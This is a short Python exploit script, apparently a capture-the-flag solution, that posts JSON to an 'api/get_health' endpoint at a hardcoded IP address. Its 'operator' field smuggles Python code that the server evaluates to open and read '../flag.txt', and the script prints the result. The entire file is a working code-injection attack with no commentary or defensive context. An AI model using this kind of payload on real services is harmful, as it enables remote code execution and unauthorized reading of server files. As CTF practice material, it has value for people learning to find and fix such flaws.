#!/bin/env python3

import requests
import json

uri='http://167.71.137.174:32087/'
path='api/get_health'

code = "\nwith open('../flag.txt', 'r') as f:\n\tresult=f.read()\nfoo="

payload = {"current_health":"100","attack_power":"100","operator":code}

json_payload=json.dumps(payload)

headers = {"Content-Type":"application/json"}
response = requests.post(uri+path,json_payload, headers=headers)

print(response.text)